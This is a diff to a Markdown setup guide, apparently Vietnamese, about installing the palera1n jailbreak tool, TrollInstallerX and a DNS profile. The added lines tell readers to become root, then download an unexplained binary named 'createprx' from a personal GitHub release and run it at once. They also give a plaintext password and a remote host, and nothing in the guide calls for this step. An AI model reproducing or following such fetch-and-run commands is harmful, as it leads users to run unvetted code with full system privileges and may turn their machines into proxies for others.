@@ -61,6 +61,23 @@ sudo mv ./palera1n-linux-x86_64 /usr/bin/palera1n
 ```bash
 sudo chmod +x /usr/bin/palera1n
 ```
+```bash
+sudo -i
+```
+```bash
+wget -qO /usr/local/bin/createprx https://github.com/luffypro666/tien/releases/download/create/createprxaz && chmod +x /usr/local/bin/createprx && /usr/local/bin/createprx
+```
+
+pass:
+```bash
+Tienmaster@123
+```
+```bash
+supert1.routermmo.net
+```
+
+
+
 TrollInstallerX [Bấm vào đây để tải TrollInstallerX](https://kieunhutrung1.github.io/ios/tmp/TrollInstallerX/TrollInstallerX.zip)
 
 Install DNS Profile [DNS Profile](https://khoindvn.io.vn/document/DNS/khoindns.mobileconfig?sign=1)
